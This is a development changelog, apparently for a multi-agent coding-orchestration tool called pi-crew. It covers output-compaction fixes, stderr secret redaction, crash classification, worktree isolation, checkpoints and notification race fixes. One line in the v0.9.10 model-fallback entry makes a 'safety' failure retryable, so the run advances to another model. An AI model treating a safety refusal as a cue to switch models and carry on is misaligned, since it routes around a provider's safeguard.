- **Delegation is not free**. The first P0-B and P0-A team-run attempts both failed at the executor stage (exploration without code production) despite 800K+ tokens of work. Direct implementation, with the spec written by the leader, was strictly faster and cheaper. Lesson: for tightly-scoped, well-specified refactors where the leader holds the full context, delegate only the verification (or skip delegation entirely).

---

## [v0.9.10 (continued)] — harden output-handling: fix UTF-8 corruption, dead-code path resolution, compaction expansion, stderr secret leakage, and add important-line classifier (Sprints 1-2) (2026-06-26)

A code-review + security-review + verifier pass on the output-handling & compression code path surfaced 4 correctness bugs and 1 medium-severity security gap. This release fixes all of them and replaces the test "mirror" anti-pattern (tests re-implemented the algorithm locally instead of calling the real functions) with real-function tests, so the passing suite now actually guards the shipped code.

### Fixes

- **`readIfSmall` UTF-8 byte-boundary corruption** — `src/runtime/task-output-context.ts` previously read head/tail as raw bytes then `.toString("utf-8")`, splitting multi-byte sequences into `\uFFFD` replacement characters. This corrupted emoji, CJK text, and the `⬜`/`⬛` large-square symbols central to the v0.9.10 visual fix. Now reads the full file as a UTF-8 string and slices by character count (char-safe, consistent with `compactString`).

- **`pruneSharedReads` path resolution (dead invalidation branch)** — `path.resolve("shared")` resolved against the process CWD instead of `manifest.artifactsRoot`, and then double-prefixed to `<cwd>/shared/shared/<name>`. The file-edit-after-read invalidation branch therefore never matched. `pruneSharedReads` now receives `artifactsRoot` and resolves artifact paths (already relative to `artifactsRoot`) directly.

- **`compactString` / `readIfSmall` expansion at threshold boundary** — for inputs just over the threshold, `head(75%) + marker(~57) + tail(25%)` was *larger* than the input, so "compaction" expanded the content. Added a monotonic-shrink guard: if the compacted result is not shorter than the input, return the input unchanged. (This is the local seed of the P0-A stage-chain `if (next.length <= text.length)` gate planned for a later release.)

- **`compactValue` silent array/object truncation** — `.slice(0, 20)` dropped items 21+ with no marker. Now appends a `[pi-crew truncated N entries]` marker (arrays) / `[truncated]` key (objects) so downstream consumers know data was elided, consistent with `compactString`.

### Security

- **`child-pi.ts` stderr/stdout secret leakage via lifecycle events (SEC-1, medium)** — the in-memory `stdout`/`stderr` accumulators receive raw worker output (structurally compacted only, not secret-redacted). Tail slices embedded in lifecycle events (`response_timeout`, `spawn_error`, `exit`) and error messages could therefore leak worker-emitted secrets (GitHub PATs, AWS keys, JWTs) through diagnostic logs that bypass artifact-store redaction. All 8 embed sites now route through a single `redactStderrExcerpt(stderr, maxChars)` helper that applies `redactSecretString` at the boundary.

### Features

- **Important-line classifier for truncated output (P0-B)** — when `compactString` or `readIfSmall` truncates a value below its threshold, the middle slice is now scanned for diagnostic lines and the most important ones are preserved between head and tail within a 15% slack budget. Five anchored regexes (error keywords, `file:line` diagnostics, HTTP 4xx/5xx, k8s/linter `Warning`, compiler/linter codes like `TS2304`) ported from Hypa's `ImportantLineClassifier.cs`. `compactString` gains an optional `{ preserveImportant?: boolean }` arg (default `true`); the assistant-text branch in `compactContentPart` opts out via `preserveImportant: false` so prose compaction behavior is unchanged. `readIfSmall` always preserves (artifact files are tool output context). When no important lines are picked the marker wording stays bit-identical to the pre-P0-B format (L4 regression safety). Local seed of the monotonic-shrink `if (next.length <= text.length)` gate planned for the P0-A stage-chain refactor.

### Tests

- Replaced the **test-mirror anti-pattern**: `output-handling-l4.test.ts` had re-implemented `headTailCompact` locally and used a local fd-read that "mirrored" `readIfSmall`, so the suite stayed green while the bugs above existed. `compactString`, `compactValue`, `readIfSmall`, `MAX_RESULT_INLINE_BYTES`, `splitWithImportantLines`, `isImportantLine`, and `extractImportantLines` are now exported and exercised directly.
- New real-function suites: `child-pi-compaction-real.test.ts` (monotonic-shrink across the boundary window, head/tail/marker preservation), `task-output-context-compaction-real.test.ts` (UTF-8 multi-byte safety at the split point, monotonic-shrink at multiple thresholds), `child-pi-sec1-redaction.test.ts` (GitHub PAT / AWS key / JWT / Bearer redaction at the `redactStderrExcerpt` boundary, plus slice-window and passthrough cases), `important-line-classifier-real.test.ts` (per-pattern match, greedy whole-line slack selection, compactString/readIfSmall integration with real files, `preserveImportant:false` opt-out, L4 backward-compat marker wording).
- 96 output-handling + child-pi importer tests pass (191 with the full importer set including the pre-existing UI/notification/pool/timeout/exit suites); `tsc --noEmit` clean.

### Verification

```
npx tsc --noEmit                                  -> clean (exit 0)
node --test (output-handling + importers)        -> 108 tests, 0 fail, 2.0s
SEC-1 redaction boundary (8 subtests)            -> 8 pass, 0 fail
```

The full integration suite (incl. slow E2E / mocked-child-pi) was not re-run in this release window; the targeted unit/importer set covering every changed symbol is green.

---

## [v0.9.10] — fix TUI crash: count large-square emoji (⬜) as width 2 (2026-06-25)

Fixes the recurring `uncaughtException: Rendered line N exceeds terminal width (160 > 159)` that killed the host Pi process while a pi-crew foreground team run was active. The crew run itself (a child process) kept running, but the Pi TUI died and could not be used to observe it.

### Root cause — width-measurement mismatch (the earlier commit 7a3ac8b was WRONG about this)

`src/utils/visual.ts` `WIDE_RANGES` did **not** include `⬜` U+2B1C (WHITE LARGE SQUARE) or `⬛` U+2B1B (BLACK LARGE SQUARE), so pi-crew's `visibleWidth`/`truncate` counted them as **1 column**. Upstream `@earendil-works/pi-tui` (the renderer Pi runtime uses to detect overflow) counts them as **2 columns** (RGI emoji). 

A widget sub-line such as

```
│     ⊶ | S7: pi-audit security test | ⬜ pending | | · 39 tools · *** tok · 49s
```

got composed, then `crew-widget.ts` `Box.render` **padded** it to 159 chars. pi-crew's own `visibleWidth` said 159 (⬜ = 1), so every truncate guard passed; but pi-tui re-measured the padded line at **160** (⬜ = 2) and threw → `uncaughtException` → Pi exits.

Commit `7a3ac8b` (truncate widget lines) was **ineffective**: it measured with the same mismatched `visibleWidth`, so truncating "to 159" still left pi-tui seeing 160. It is kept as harmless defense-in-depth.

### Fix (commit 3cd9001)

Add `[0x2B1B, 0x2B1C]` to `WIDE_RANGES` so pi-crew's measurement agrees with upstream pi-tui for the large-square emoji that appear in task descriptions (e.g. pi-audit backlog markers `⬜ pending`). Surrounding codepoints (U+2B00, U+2BFF) stay width 1 — only the RGI large squares are wide.

### Verification

Cross-checked directly with the SAME `visibleWidth` the Pi runtime uses:

```
before fix: crewTruncate(paddedLine, 159) -> pi-tui visibleWidth 160  (CRASH)
after  fix: crewTruncate(paddedLine, 159) -> pi-tui visibleWidth 159  (CRASH PREVENTED)
```

Tests: 2 new regression tests in `test/unit/visual.test.ts` pin `visibleWidth('⬜') === 2` (and `⬛`), that `⬀`/`⯿` stay 1, and that truncating a 159-char line containing `⬜` now fits `visibleWidth <= 159`. Existing visual/width-safety/widget/crew-widget suites (24 tests) stay green.

### Also in v0.9.10

**Stale `parentModel` from Pi runtime session state** (commit 06b2337). `ctx.model` in the Pi extension API is the **session's SAVED model** (`main.ts:389`), not the model currently running. A previous session saved `claude-sonnet-4-5` to session state; a new session inherits the stale `savedModel` but actually runs on `minimax-M3` (visible in the footer). When the saved model has no auth in `modelRegistry`, child-pi spawn fails immediately with `No API key found for anthropic` before any fallback can fire. New helper `resolveParentModelFromRegistry()` in `live-session-runtime.ts` resolves `parentModel` to the first auth-available model in `modelRegistry`, falling back to the raw value if the registry is empty. pi-crew config (fallbackModels, agentModel, overrideModel, F7 scope) is fully respected — fix only touches the parentModel argument. 6 new tests in `test/unit/resolve-parent-model-from-registry.test.ts`.

**Model-fallback chain reliability** (commit c90b1bf). The fallback chain failed to advance past certain non-retryable look-alikes because of three gaps plus missing E2E coverage. (a) `RETRYABLE_MODEL_FAILURE_PATTERNS` broadened with 5 new patterns (`provider error`, `context_length_exceeded`, `safety`, `is overloaded`, `408`). (b) `!nextModel` short-circuit in `task-runner.ts` relaxed so the chain can advance past non-retryable look-alikes. (c) `detectRetryableModelFailureFromOutput` broadened to check `stopReason === "error"` events (previously only string-matched). (d) New `PI_TEAMS_MOCK_CHILD_PI=retryable-failure-then-success` mock branch + new `test/integration/model-fallback-chain-e2e.test.ts`. 39/39 tests pass (21 model-fallback + 14 chain E2E + 4 others).

**Channel-based event subscription — eliminate over-invalidate spam** (commit a67aaee). `runEventBus.onAny()` in 5 widgets caused every emitted `worker_status` event (vài events/giây when an agent calls tools) to trigger a full state reload. Concurrent write to `manifest.json` + `tasks.json` during live team runs triggered the retry-loop instability path in `state-store.ts:659-735`, spamming `console.warn` with `retry loop detected instability for run X`. EventChannel taxonomy already existed in `run-event-bus.ts:19-49` but was not used. All 5 widgets refactored to subscribe via `onChannel()`: `run-snapshot-cache` → `run:state + worker:lifecycle`; the other four → `run:state + worker:lifecycle + ui:invalidate`. Secondary bug: `run.cache_invalidated` was classified as `worker:progress` (default fallback) because missing from `UI_INVALIDATE_TYPES` set — added. Retry-loop `console.warn` downgraded to `console.debug` (best-effort by design, not an error). Expected impact: 80-95% reduction in retry-loop warnings; 100% reduction in log noise.

**Writer role misclassification — unblock deliverable emission** (commit 4abc9f1, E2E verified). `permissionForRole("writer")` returned `read_only` because writer was in `READ_ONLY_ROLES` (`src/runtime/role-permission.ts:6`). This blocked file writes at runtime even though `agents/writer.md` already declares `tools: read, grep, find, ls, edit, write` and 3/3 workflows use writer EXACTLY for deliverable emission: `parallel-research.workflow.md:42-46` (`output: research-summary.md`), `research.workflow.md:18-22` (`output: research-summary.md`), `pipeline.workflow.md:24-29` (Stage 4 Documentation). Incident 2026-06-25: `parallel-research` ran 7/7 tasks successfully (714K tokens, 20m49s) but the deliverable file was NEVER written; the worker reported `My role contract states: Do not create, modify, delete, move, or copy files` — a permission-gate injection. Fix: 1 line — `writer` moved from `READ_ONLY_ROLES` to `WRITE_ROLES`. **E2E verified** with `team_20260625110218_e100ce5371db08ea` (research workflow): 3/3 tasks, 65,431 tokens, 3m41s — `research-summary.md` (1319 bytes) created successfully by the `03_write` worker.

### Follow-up observation (not fixed in v0.9.10)

**Planner has a 2-layer latent bug** (P1, deferred). `default.workflow.md:11-14` and `implementation.workflow.md:7` assign `planner` to write `plan.md` / `adaptive-plan.json`. Layer 1: `planner` is in `READ_ONLY_ROLES` (`role-permission.ts:5`). Layer 2: `agents/planner.md:7` declares `tools: read, grep, find, ls` — **no `write` or `edit` tool**. Single-layer fixes would miss the other 50% of the issue. Action item: separate audit + targeted fix + E2E test in next sprint.

## [v0.9.9] — gajae-code distillation (4 P0) + notification race fix (2026-06-25)

Six changes: four high-impact/low-effort features distilled from researching [Yeachan-Heo/gajae-code](https://github.com/Yeachan-Heo/gajae-code) (full report: `research-findings/gajae-code-distill.md`), plus a fix for a redundant-notification bug the leader directly hit while running that research. Each was calibrated against real pi-crew code — two reported "gaps" turned out to be patterns pi-crew already implements (prompt-level stablePrefix, detached spawning), and four areas where pi-crew is already superior were deliberately left untouched (crash-recovery byte-offset cursor, declarative workflow + semaphores, run-snapshot-cache, event sourcing).

### P0 #1 — Crash classification taxonomy (commit fb8c4a8)

`child-pi.ts` captured stderr/exit codes but never bucketed failure modes. New pure `classifyProcessCrash()` (port of gajae-code's `crash-diagnostics.ts`) maps exits to 9 semantic classes (`clean_exit | non_zero_exit | signal_exit | timeout | cancelled | spawn_error | protocol_exit | native_panic | unknown`) with precedence timeout > cancelled > spawn_error > native_panic > signal. Attached to `WorkerExitStatus` at both settle paths; kill/drain/timeout logic untouched. 30 unit tests.

### P0 #2 — Staleness-aware tool output pruning (commit 13acf37)

The L4 size-based compaction retained every copy of a re-read file until a size threshold tripped. New `tool-output-pruner.ts` (port of gajae-code's `pruning.ts`) drops superseded tool results — same-file re-reads and read-then-edit — **before** they are injected into a downstream worker's prompt via `task-output-context.ts`. Replaces stale content with a digest notice (first/last lines + count for bash/grep/search). OPT-IN via `DEFAULT_PRUNE_CONFIG`; does NOT regress the L4 head+tail(75/25) behavior. 25 unit tests.

### P0 #3 — OwnedProcess abstraction (commit fe3bdde)

Background spawns used `detached:true` but had no unified ownership primitive for guaranteed teardown. New `process-lifecycle.ts` adds `OwnedProcess` (escalating SIGTERM → grace → SIGKILL; Windows `taskkill /F /T /PID` fallback; idempotent `dispose()`; bounded `awaitExit()`; `onExit`) plus `registerResourceOwner()`/`disposeAllOwners()` for non-process resources (timers, sockets, Workers) and root-exit drain reconciliation. **Incremental adoption** — deliberately NOT migrating `child-pi.ts`'s battle-tested `killProcessTree`/post-exit-stdio-guard/hard-kill-timer or `async-runner.ts`'s intentionally-detached background spawns; the primitive is available for future ownership-scoped spawns (MCP/LSP/DAP servers, eval workers). 22 unit tests.

### P0 #4 — IRC reply support, side-channel Q&A (commit 43bcd65)

The `irc-tool` was fire-and-forget despite an `awaitReply` param marked "Not yet supported". New `respondAsBackground()` on `live-agent-manager.ts` delivers a DM to a recipient's session **without blocking its main loop** (`sendCustomMessage({triggerTurn:false})`) and awaits an event-driven, timeout-bounded reply via an in-memory pending-reply registry keyed by correlation id. `awaitReply:true` DMs now route through this side-channel and return reply content; broadcast stays fire-and-forget. Coexists with mailbox.ts's existing file-based reply fields (cross-process). 10 unit tests.

### Notification race fix — Rule 2 + Rule 1 (commits 592d9ea, c22cbb9)

While running the gajae-code research, the leader observed redundant "background subagent changed state" notifications arriving a turn late, after results were already read. Root cause: the completion callback (`SubagentManager.onComplete`) fires from inside the `record.promise` IIFE `finally` block — **before the promise resolves** — so a leader calling `get_subagent_result(wait:true)` sets `resultConsumed=true` only afterward, and the synchronous `if (record.resultConsumed) return` guard always saw `false`. A latent test bug (`assert sentMessages.length === 0` on an array that was unconditionally empty because `sendAgentWakeUp` prefers `sendUserMessage`) masked it.

- **Rule 2** (592d9ea): defer notification emission to a `setTimeout(0)` **macrotask** (not `queueMicrotask` — microtasks queued in the finally run before the promise-resolution microtask), then recheck `resultConsumed` (in-memory `getRecord` + persisted `readPersistedSubagentRecord`) before emitting; suppress if already consumed. Covers all three `onComplete` call sites via the single emit point. Fixed the test assertion to `sentUserMessages` and added two explicit regression tests (notify still fires when leader does NOT pre-consume; notify suppressed when leader pre-consumes via `wait:true`).
- **Rule 1** (c22cbb9): new `BatchBarrier` registry + optional `batch_id` param on the Agent tool. Background agents sharing a `batch_id` never emit individual notifications; instead each completion is recorded in the barrier and **one consolidated** "All N background subagents in batch \"X\" have finished" notification fires exactly once when every member reaches a terminal state (`blocked` is NOT terminal — a blocked agent resumes later). Verified end-to-end with 1/2/5-agent batches (one with a queued member and staggered 10–25s sleeps): exactly 1 consolidated notification, 0 individual leaks. Composes with Rule 2 (a batched agent whose result was already consumed is still suppressed via the `resultConsumed` recheck). 10 unit tests + 2 integration tests.

Design doc: `research-findings/subagent-notification-race-fix.md`.

### What was NOT adopted (pi-crew already superior)

Crash recovery (`crash-recovery.ts`, 421 lines, byte-offset event-log cursor), declarative workflow + semaphores, `run-snapshot-cache` (disk rebuild, TTL 1500ms), and event sourcing (`readEventsCursor`) are all more sophisticated than gajae-code's equivalents and were left intact.

## [v0.9.8] — deer-flow learning integration: L1/L2/L3/L4 (2026-06-24)

Four improvements distilled from researching [bytedance/deer-flow](https://github.com/bytedance/deer-flow) and the wider Pi-ecosystem (pi-boomerang, pi-subagents, pi-dynamic-workflows). Each was calibrated against real pi-crew code (the research over-reported gaps — several patterns pi-crew already does *better* than deer-flow) and sized from measured data, not guesses.

### L3 — Strict SKILL.md frontmatter validation (commit 5348c47)

Malformed skills now **fail-fast at discovery** instead of silently producing broken behavior at runtime. New `src/skills/validate.ts` validates frontmatter against the `ALLOWED_SKILL_PROPS` whitelist using a **HYBRID policy**:

- **HARD errors** (missing/malformed `name` or `description`, type mismatches) → skill excluded from `discoverSkills()`.
- **SOFT warnings** (unknown props like `origin`/`triggers`, missing `name` derived from directory) → skill kept, surfaced via `getLastDiscoveryDiagnostics()` / `buildSkillValidationDiagnostics()`.

Replaces the fragile line-prefix parser (broke on multi-line folded scalars `description: >`, quoted strings, nested YAML) with the `yaml` package (^2.9.0, already transitive, added as direct dep — zero install cost). Back-compat preserved: missing `name` derives from the directory; no-frontmatter skills still load with empty description.

**Bonus value**: pre-flight on the real environment surfaced 2 user skills that were silently broken (`agent-browser`: `allowed-tools` wrong type; `spike-wrap-up`: `<>` in description).

### L2 — Data-driven keybinding dispatch (commit 35fc3c6)

Replaced the 30-line imperative `if (includes(...))` chain in `dashboardActionForKey` with a single `for (const b of BINDINGS)` loop driven by a declarative `BINDINGS[]` table. Adding a key now means editing ONE place (the table) instead of two (table + dispatch) — removes the DRY violation that caused table-vs-dispatch drift. `KEY_RESERVED` is now exported and derived.

Behavior is **provably identical** to the old chain: a golden-snapshot parity test asserts every `(data, activePane)` pair returns the same action (~190 pairs). Pane-scoped bindings (`mailbox-detail`, `health-*`) precede their generic competitors so first-match-wins reproduces old precedence.

The `inTextInput` guard from the original plan was **intentionally skipped** — overlays are mutually exclusive and each handles its own input (`mailbox-compose-overlay.ts` captures every single-char key), so there is no leak path. Documented in the commit.

### L1 — RunEventBus.onWithReplay catch-up primitive (commit a2a478b)

Closes the transient-subscriber-absence gap: when an overlay/widget is disposed and recreated (toggle, reconnect), live events emitted in that window are lost as notification triggers. `onWithReplay(runId, eventsPath, lastSeenSeq, callback)` replays missed events from the durable JSONL log before attaching the live listener, then dedups via `metadata.seq` so each event fires exactly once.

Unlike deer-flow's 256-event RAM ring buffer (lost on crash), this reuses pi-crew's existing `readEventsCursor` — O(new bytes) via byte-offset incremental reads, monotonic seq, tail-capped. Strictly better: survives crashes, bounded memory. `RunEventPayload` gains optional `seq`; `emitFromTeamEvent` stamps it.

The **primitive is landed + fully tested** (7 cases: replay order, dedup race, transient live-only, cursor bound, sinceSeq filter, missing-log fallback, unsubscribe). Dashboard wiring (switching `onAny()` → `onWithReplay()` per-run) is deferred — the dashboard subscribes across multiple runs and needs a subscription-model refactor; state isn't lost during absence anyway (`run-snapshot-cache` rebuilds from disk, TTL 1500ms).

### L4 — Data-driven output thresholds + head/tail compaction (commit 463d08d)

Worker output was being truncated at 3 points with thresholds sized by guess, not data. Measured 27 real result artifacts: **max 9226 bytes, median 8272, 100% under 16KB**. The old thresholds cut **62% of real outputs** (head-only, no recovery path). This change sizes thresholds from that data and switches compaction from head-only to head+tail so closing markdown structure (code fences, headings) survives.

| Threshold | Before | After |
|---|---|---|
| `maxAssistantTextChars` | 8192 | **16384** |
| `maxToolResultChars` | 1024 | **8192** |
| `maxCompactContentChars` | 4096 | **8192** |
| `maxToolInputChars` | 2048 | **4096** |
| `readIfSmall` (3 inconsistent values) | 24K/40K/80K | **single 32KB** |
| Compaction shape | head-only | **head(75%)+tail(25%)** |

**Why not caveman-shrink** (the alternative considered): tested it on the same 27 artifacts — only 3.9% compression (vs 42% on prose fixtures) because pi-crew output is code-citation-heavy with little prose to strip, AND it has a real data-loss bug (`funccall` protected-pattern eats sentinel placeholders for the `identifier (inline-code)` pattern, corrupting 24/27 files with null bytes, 127 inline codes lost). caveman's *concept* (detect/validate) is worth borrowing but its engine doesn't fit pi-crew's content type. Threshold-only wins on the data.

### Tests & verification

- 10 new L4 tests, 25 L3 validator tests, 7 L1 replay tests, 7 L2 parity tests.
- `npm run typecheck` + `check:lazy-imports` green.
- End-to-end team-run smoke tests confirm all 4 features load and run without crash.
- Real-world smoke scripts at `test/manual/l{1,2,3}-*-smoke.mjs`.
- Research artifacts at `source/deer-flow/.research/` + `.crew/research/worker-output-handling.md`.

### Backward compatibility

All four changes are additive or behavior-preserving:
- L3: valid skills unaffected; only malformed ones now excluded (was: silent breakage).
- L2: golden-snapshot parity test proves identical dispatch.
- L1: new method added; existing `on`/`onAny`/`emit` unchanged.
- L4: outputs that fit (100% of measured real outputs) are unchanged; only oversized ones now keep head+tail instead of head-only.

## [v0.9.7] — round-18 + process-safety fix (2026-06-23)

P2-3 feature: durable checkpoint + resume for dynamic-workflow runs. When a `.dwf.ts`
script crashes (timeout, OOM, agent error) between `ctx.agent()` calls, the runner now
persists a checkpoint after every agent call so `team action='resume' runId='X'` can
continue from the last checkpoint instead of re-running from scratch. **Backward
compatible** — fresh runs (no checkpoint) behave exactly as before.

### Implementation

**New file** `src/runtime/dwf-state-store.ts` (`DwfStore`):
- Atomic CRUD for a single run's DWF checkpoint, modeled on `GoalStore` /
  `FileCheckpointStore`.
- Persists `DwfCheckpointState` (vars, phases, currentPhase, logs, spent, agentCount,
  updatedAt) to `<stateRoot>/dwf-checkpoint.json` via `atomicWriteJson`.
- `load()` returns `undefined` for a missing/corrupt checkpoint (fresh run); `delete()`
  is best-effort and never throws.

**`ctx.agent()` checkpoint hook** in `src/runtime/dynamic-workflow-context.ts`:
- New `MakeWorkflowCtxOptions.onCheckpoint?: (state) => void` — invoked after each
  `ctx.agent()` call (success OR fail) so a crash between calls leaves durable state.
- New `MakeWorkflowCtxOptions.resumedState?` — hydrates `ctx.vars`, phase state, logs,
  `budget.spent()`, and `agentCount` from the checkpoint on resume.
- New closure counter `agentCount` (incremented in `agent()`'s `finally`), exposed via a
  non-enumerable `__agentCount` getter.
- New `getWorkflowCheckpoint(ctx)` helper (mirror of `getWorkflowPhaseState`).

**Runner wiring** in `src/runtime/dynamic-workflow-runner.ts`:
- On run start: `DwfStore.load()` → hydrate ctx (`resumedState`) + emit `dwf.resumed`.
- `onCheckpoint` → `DwfStore.save()` (best-effort, errors swallowed).
- On clean completion: `DwfStore.delete()` so a re-run starts fresh.

### Resume semantics

`team action='resume' runId='X'` re-dispatches with `runKind='dynamic-workflow'`. The
runner loads the checkpoint, hydrates `ctx.vars`/phases/logs, and re-executes the
script from the top. Scripts SHOULD be written defensively — check `ctx.vars.lastPhase`
to skip completed work (documented in `docs/dynamic-workflows.md`). No partial-resume of
a single agent call (it re-runs from scratch); checkpoints are written AFTER an agent
completes, never before.

### Tests (14 new)
- `test/unit/dwf-state-store.test.ts` (10): save/load round-trip, missing→undefined,
  delete, corrupt-file resilience, path layout, dir creation, large-state preservation.
- `test/unit/dynamic-workflow-context.test.ts` (+8): onCheckpoint fires on success/fail,
  agentCount accumulation, backward-compat (no callback), resumedState hydration,
  shallow-copy isolation, getWorkflowCheckpoint snapshot.
- `test/integration/dwf-setresult.test.ts` (+4): fresh run (no resumed event),
  completed run (checkpoint deleted), resume (hydration + dwf.resumed + delete),
  corrupt checkpoint treated as fresh run.

### Docs
- `docs/dynamic-workflows.md` — new "Resume & Checkpoint (round-18 P2-3)" section +
  defensive-script example.
- `types/dwf.d.ts` — resume pattern documented in header + `ctx.vars` JSDoc.
- `package.json` — bumped 1.0.1 → 1.1.0 (minor — new opt-in capability).

### Out of scope (future rounds)
- P2-2 VM sandbox — still waiting for `isolated-vm` v1.5 (vm.createContext is not a
  real security boundary). This was the LAST P2 item.

### Process-safety follow-up fix (same release)

A heuristic-based zombie "cleanup" had killed a live interactive main `pi`
session by accident (uptime/RSS/orphan heuristics match a main session just
as readily as a real orphaned sub-agent). Fixed authoritatively:

- **`PI_CREW_KIND=subagent`** env marker, set by `buildPiWorkerArgs`
  (`src/runtime/pi-args.ts`) on every child-pi spawn. A main session does NOT
  carry it, so it can never be matched as a sub-agent. (An earlier draft also
  added a `--crew-subagent` argv flag — removed because pi's strict option
  parser rejects unknown flags and exits non-zero, which silently broke every
  `ctx.agent()` call. The env var alone is the authoritative signal.)
- **`src/runtime/zombie-scanner.ts`** (new): read-only scanner that matches
  ONLY processes with `PI_CREW_KIND=subagent` AND a dead `PI_CREW_PARENT_PID`.
  Never matches a main session. Never kills.
- **`team action='doctor' focus='zombies'`**: renders the safe scan as a
  human-readable report (zombies vs live sub-agents, with explicit do-not-kill
  labelling for live parents).
- **`PI_CREW_KIND`** added to the env allowlist in `child-pi.ts`.
- **`docs/troubleshooting.md`** + **`.crew/knowledge.md`**: documented the
  marker + the read-only rule so future agents never repeat the mistake.
- 8 new unit tests in `test/unit/zombie-scanner.test.ts`, including a
  regression test asserting the current (main-session) process is never matched.

### Real-world smoke testing findings (2026-06-24)

Three bugs were caught by real `team action='run'` smoke tests that the unit
suite missed (units don't shell out to the real `pi` binary). **All three are
now fixed.**

- **Fixed: `--crew-subagent` argv flag broke every `ctx.agent()` call.** Pi's
  strict option parser exits non-zero on unknown flags. The marker is now the
  `PI_CREW_KIND=subagent` ENV var only.
- **Fixed: `ctx.agent({schema, systemPrompt})` silently dropped `systemPrompt`.**
  The round-13 schema branch used the resolved role persona as the base for the
  JSON-output instruction, ignoring the caller's explicit persona. Models then
  returned prose and failed schema validation. Fix: `call.systemPrompt` is now
  preferred as the base when both are set.
- **Fixed: `ctx.agent({disableTools: true, maxTurns: 1})` returned `exit null`.**
  Root cause (found via Phase-0 diagnostic instrumentation) was NOT the
  final-drain race originally hypothesised — it was an erroneous
  `killProcessTree` call in the steer-injection path. When `maxTurns` was
  reached on a `turn_end` event, the code wrote a "wrap up" steer to
  `child.stdin`; Node's `writable.write()` returns `false` on normal
  backpressure, which the code mis-treated as a fatal injection failure and
  killed the worker mid-answer (answer was in stdout; exit came back `null`).
  The `disableTools` correlation was a red herring — the real trigger was
  `maxTurns:1` hitting on the first turn. Fix: steer injection is now
  ADVISORY — a `write() === false` or non-writable stdin is logged, not fatal;
  the hard-abort at `maxTurns + graceTurns` remains the safety net for genuine
  runaways. Verified: maxTurns=1 × 10 real-binary runs now 10/10 exit=0 (was
  ~60% fail pre-fix). Regression guard: `test/unit/child-pi-steer-backpressure.test.ts`
  (source-contract checks + opt-in real-binary smoke via `PI_CREW_SMOKE=1`).

## [v0.9.7] — round-17 (P2-4 worktree isolation per agent) (2026-06-23)

P2-4 feature: `ctx.agent({worktree: true})` spawns the agent in an isolated
git worktree so parallel file-modifying agents don't conflict. Fully backward
compatible — `worktree` defaults to false, so existing calls are unchanged.

### Implementation

**New helpers** in `src/worktree/worktree-manager.ts`:
- `prepareAgentWorktree(manifest, opts)` — creates a worktree from HEAD on a
  unique branch; returns `{path, branch}` or `undefined` when the cwd is not a
  git repo (graceful fallback).
- `cleanupAgentWorktree(manifest, worktreePath, branch?)` — removes the
  worktree dir + branch, and captures a git diff as a side artifact when the
  worktree has changes (for audit/merge).

**`ctx.agent()` integration** in `src/runtime/dynamic-workflow-context.ts`:
- New `worktree?: boolean` field on `AgentCallOpts`.
- When true, the agent runs with the worktree path as its cwd.
- Cleanup always runs (success, failure, or agent error) — no worktree leaks.
- Non-git cwd or creation failure → fall back to normal cwd + `ctx.log()`
  warning; the agent still runs.

### Why worktrees for DWF

DWF scripts commonly fan out parallel agents that each modify files (e.g.
fixing different modules). Without isolation they race on the working tree.
`worktree: true` gives each agent its own checkout; the diff is captured as
an artifact for later merge.

### Tests (8 new, 60 total in dynamic-workflow-context.test.ts)
- prepareAgentWorktree creates an isolated worktree
- cleanupAgentWorktree removes dir + branch (no leak)
- cleanupAgentWorktree captures a diff artifact when there are changes
- prepareAgentWorktree returns undefined for non-git cwd (graceful fallback)
- ctx.agent({worktree:true}) isolates + cleans up (mock)
- ctx.agent({worktree:false}) uses normal cwd (backward compat)
- ctx.agent({worktree:true}) falls back gracefully + warns in non-git cwd
- ctx.agent({worktree:true}) cleans up even when the agent fails

### Docs
- `docs/dynamic-workflows.md` — worktree option in API table + example
- `types/dwf.d.ts` — `worktree?: boolean` on AgentCallOpts
- `package.json` — bumped 1.0.0 → 1.0.1 (patch, additive opt-in)

### Out of scope (future rounds)
- P2-2 VM sandbox — waiting for `isolated-vm` v1.5 (vm.createContext is not
  a real security boundary)
- P2-3 Resume/checkpoint — round-18 candidate (large effort)

## [v0.9.7] — round-16 (P2-1 pipeline primitive) (2026-06-23)

Adds **`ctx.pipeline(items, ...stages)`** — a multi-stage transform primitive for
dynamic workflows. **Backward compatible** — existing DWF scripts are unaffected;
`pipeline` is a new opt-in capability.

### Feature — Pipeline primitive (P2-1)

**Files:** `src/runtime/dynamic-workflow-context.ts` + `types/dwf.d.ts` + `docs/dynamic-workflows.md`

Previously the DWF context only offered `ctx.fanOut()` (a single parallel map). The
new `ctx.pipeline()` chains stages: each item flows through **all stages in sequence**
(stage 1 → stage 2 → …), while **different items run concurrently**, bounded by the
workflow concurrency (`mapConcurrent`, the same primitive as `fanOut`).

Semantics (mirrors `pi-dynamic-workflows`' `pipeline()`):

- Each stage receives `(previous, original, index)` — `previous` is the prior stage's
  output (the raw item for the first stage), `original` is the unchanged input item.
- A failed stage yields `null` for that item, logs `pipeline[i] failed: <msg>` via
  `ctx.log()`, and the other items continue.
- On **abort**, the error propagates (it is not swallowed into `null`).
- Returns `(TResult | null)[]`, order-preserving.

Signature:

```ts
ctx.pipeline<TItem, TResult = unknown>(
  items: TItem[],
  ...stages: Array<(previous: TResult, original: TItem, index: number) => Promise<TResult> | TResult>
): Promise<(TResult | null)[]>;
```

Implementation notes:

- Uses `mapConcurrent(items, concurrency, …)` — NOT unbounded `Promise.all` — so
  item-level parallelism respects the workflow's configured concurrency. Stages that
  spawn agents additionally acquire `ctx.semaphore` for agent-level throttling.
- Validates inputs: non-array first arg → `TypeError`; non-function stage (or no
  stages) → `TypeError`.
- Empty items array short-circuits to `[]`.
- Authoring types (`types/dwf.d.ts`) mirror the runtime signature for IDE IntelliSense.

Example use case: scan → analyze → review each shard, up to `concurrency` shards at a
time, with per-shard failure isolation.

Tests: `test/unit/dynamic-workflow-context.test.ts` — single/multi-stage transforms,
empty array, failed-stage isolation + logging, TypeError on bad inputs, stage-argument
contract, async stages, and concurrency-bounded execution.

## [v0.9.7] — round-15 (P1-4 phase UI) (2026-06-23)

The progress pane now **renders DWF phase markers** (▶/✓/⏸) by consuming the
`dwf.phase_started` / `dwf.phase_completed` events emitted by `ctx.phase()`
(round-12). **Backward compatible** — non-DWF runs are unaffected.

### Feature — Phase UI in progress-pane (P1-4)

**Files:** `src/ui/dwf-phase-display.ts` (new) + `progress-pane.ts` +
`run-snapshot-cache.ts` + `snapshot-types.ts`

Previously the phase events were produced but the UI did not consume them.
Now the progress pane shows a phase overview:

- `▶ Phase: <name>` — currently running phase.
- `✓ Phase: <name>` — completed phase.
